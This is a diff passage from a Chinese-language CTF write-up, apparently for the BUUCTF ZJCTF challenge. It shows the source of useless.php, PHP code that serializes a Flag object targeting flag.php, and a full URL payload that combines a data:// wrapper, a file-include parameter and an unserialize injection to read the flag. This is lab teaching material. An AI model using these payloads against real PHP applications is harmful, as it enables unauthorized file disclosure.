@@ -311,4 +311,65 @@ else{
 ```
 要设置text文件，内容为"welcome to the zjctf"，使用php伪协议：php://input，或者data伪协议。使用data伪协议构造payload:
 `http://a01eea38-1c9d-4973-9169-67357bdd35c5.node4.buuoj.cn:81/?text=data://text/plain,welcome to the zjctf`
-第一层进入，开始绕过第二层的正则
+第一层进入，开始绕过第二层的正则。include后注释useless.php，查看useless.php源码：
+```php
+<?php
+
+class Flag{ //flag.php
+
+public $file;
+
+public function __tostring(){
+
+if(isset($this->file)){
+
+echo file_get_contents($this->file);
+
+echo "<br>";
+
+return ("U R SO CLOSE !///COME ON PLZ");
+
+}
+
+}
+
+}
+
+?>
+```
+上面的password被序列化过，类Flag注释了flag.php，将file变量设为“flag.php”，序列化对象Flag，作为password传递：
+```php
+<?php  
+
+class Flag{  //flag.php  
+
+    public $file="flag.php";  
+
+    public function __tostring(){  
+
+        if(isset($this->file)){  
+
+            echo file_get_contents($this->file);
+
+            echo "<br>";
+
+        return ("U R SO CLOSE !///COME ON PLZ");
+
+        }  
+
+    }  
+
+}
+
+$a = new Flag();
+
+echo serialize($a);
+
+// O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}
+
+?>
+```
+得到序列化后的Flag对象，构造payload:
+`[a01eea38-1c9d-4973-9169-67357bdd35c5.node4.buuoj.cn:81/?text=data://text/plain,welcome to the zjctf&file=useless.php&password=O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}](http://a01eea38-1c9d-4973-9169-67357bdd35c5.node4.buuoj.cn:81/?text=data://text/plain,welcome%20to%20the%20zjctf&file=useless.php&password=O:4:%22Flag%22:1:{s:4:%22file%22;s:8:%22flag.php%22;})`
+查看源码，拿到flag。
+关于===php伪协议===：
